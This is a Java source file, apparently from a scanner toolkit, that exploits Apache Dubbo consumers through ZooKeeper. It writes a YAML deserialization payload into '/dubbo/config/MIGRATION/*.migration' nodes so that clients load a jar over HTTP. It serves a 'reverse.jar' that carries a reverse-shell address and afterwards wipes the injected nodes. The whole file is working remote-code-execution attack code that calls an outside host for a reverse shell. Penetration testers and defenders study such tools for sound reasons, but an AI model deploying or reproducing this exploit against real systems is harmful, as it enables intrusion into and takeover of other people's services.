package scanner.exploit;

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;

import org.apache.curator.framework.CuratorFramework;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import scanner.Main;
import scanner.scan.AbstractScanner;
import scanner.scan.ZookeeperScanner;
import scanner.utils.Configuration;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;

public class ZookeeperExploiter implements AbstractExploiter {

    private Logger logger = LoggerFactory.getLogger(getClass());
    private HttpServer server;
    private List<String> applicationList = new ArrayList<String>();

    //本漏洞攻击Dubbo Consumer
    public static String stringToHex(String input) {
        StringBuilder hexString = new StringBuilder();
        for (char ch : input.toCharArray()) {
            hexString.append(String.format("%02X", (int) ch));
        }
        return hexString.toString();
    }


    private void startServer(int len) {
        try {
            server = HttpServer.create(new InetSocketAddress(Configuration.fileIp, Configuration.filePort), 0);
            server.createContext("/", new FileHandler());
            server.setExecutor(Executors.newFixedThreadPool(10));
            server.start();
            logger.info(String.format("HTTP 服务器已启动，监听端口:%d,等待%d秒", Configuration.filePort, len));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    class FileHandler implements HttpHandler {

        private Logger logger = LoggerFactory.getLogger(getClass());

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String requestPath = exchange.getRequestURI().getPath();
            logger.info("[VULN] 接受到请求来自:" + exchange.getRemoteAddress() + "请求路径:" + requestPath);
            if (requestPath.contains(".jar")) {
                String jarPath = null;
                try {
                    jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
                } catch (URISyntaxException e) {
                    throw new RuntimeException(e);
                }
                String filePath = new File(jarPath).getParent() + File.separator;
                InputStream i = new FileInputStream(filePath + "/reverse.jar");
                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                if (i != null) {
                    int bytesRead;
                    byte[] data = new byte[1024];
                    while ((bytesRead = i.read(data, 0, data.length)) != -1) {
                        buffer.write(data, 0, bytesRead);
                    }
                    byte[] fileBytes = buffer.toByteArray();
                    exchange.getResponseHeaders().set("Content-Type", "application/octet-stream");
                    exchange.sendResponseHeaders(200, fileBytes.length);
                    OutputStream responseBody = exchange.getResponseBody();
                    responseBody.write(fileBytes);
                    responseBody.close();
                }
            } else {
                exchange.sendResponseHeaders(404, -1);
            }
        }
    }

    @Override
    public void exploit(AbstractScanner scanner) {
        CuratorFramework client = ((ZookeeperScanner) scanner).client;
        List<String> applicationNameList = ((ZookeeperScanner) scanner).applicationNameList;
        if (applicationNameList.size() == 0) {
            return;
        }
        String reverseBase64ed = stringToHex(Configuration.reverseIp + ":" + Configuration.reversePort);
        String reverseFull = String.format("http://%s:%d/%s.jar", Configuration.fileIp, Configuration.filePort, reverseBase64ed);
        startServer(3 * applicationNameList.size());
        for (String name : applicationNameList) {
            logger.info("尝试注入" + name);
            String path = "/dubbo/config/MIGRATION/" + name + ".migration";
            applicationList.add(path);
            String poc = "!!org.apache.dubbo.rpc.cluster.support.migration.MigrationRule {\n  key: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"" + reverseFull + "\"]]]]\n}";
            try {
                if (client.checkExists().forPath(path) != null) {
                    client.setData().forPath(path, poc.getBytes());
                } else {
                    client.create().forPath(path, poc.getBytes());
                }

            } catch (Exception e) {
                throw new RuntimeException(e);
            }

        }

        try {
            Thread.sleep(3000 * applicationNameList.size()); // 等待5*服务个数的秒数
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        if (server != null) {
            logger.info("HTTP Server关闭");
            server.stop(0);
        }
        for (String path : applicationList) {
            try {
                if (new String(client.getData().forPath(path)).contains("ScriptEngineManager")) {
                    client.setData().forPath(path, "".getBytes());
                }
            } catch (Exception ignored) {

            }

        }

    }

}
